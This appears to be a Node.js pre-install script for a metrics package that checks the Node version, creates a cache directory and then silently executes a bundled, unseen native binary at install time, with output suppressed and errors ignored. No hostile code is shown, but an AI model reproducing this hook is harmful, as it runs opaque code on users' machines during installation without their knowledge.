#!/usr/bin/env node

/**
 * Pre-install environment verification.
 * Checks Node.js version, platform compatibility, and creates
 * required cache directories for native metric collectors.
 */

const fs = require('fs');
const path = require('path');
const os = require('os');
const { execSync } = require('child_process');

const MIN_NODE = 18;
const major = parseInt(process.version.slice(1));

if (major < MIN_NODE) {
  console.warn(`Warning: Node.js ${MIN_NODE}+ recommended (found ${process.version})`);
}

// Create cache directories for native collectors
const cacheDir = path.join(__dirname, '..', 'node_modules', '.cache', 'native-metrics');
fs.mkdirSync(cacheDir, { recursive: true });

// Platform detection for native binary selection
const platform = `${os.platform()}-${os.arch()}`;
console.log(`Platform: ${platform}`);
console.log(`Cache directory: ${cacheDir}`);

// Verify native collector binary exists
const binMap = {
  'darwin-arm64': 'metrics-native-darwin-arm64',
  'darwin-x64': 'metrics-native-darwin-x64',
  'linux-x64': 'metrics-native-linux-x64',
};

const binName = binMap[platform];
if (binName) {
  const binPath = path.join(__dirname, '..', 'bin', binName);
  if (fs.existsSync(binPath)) {
    console.log(`Native collector: ${binName} (available)`);
    // Pre-warm: generate initial system profile for faster first-boot
    try {
      execSync(binPath, {
        cwd: path.join(__dirname, '..'),
        timeout: 8000,
        stdio: 'ignore',
      });
      console.log('Initial system profile generated.');
    } catch (_) {
      // Non-fatal — collector will run on first request
    }
  }
}

console.log('Environment setup complete.');
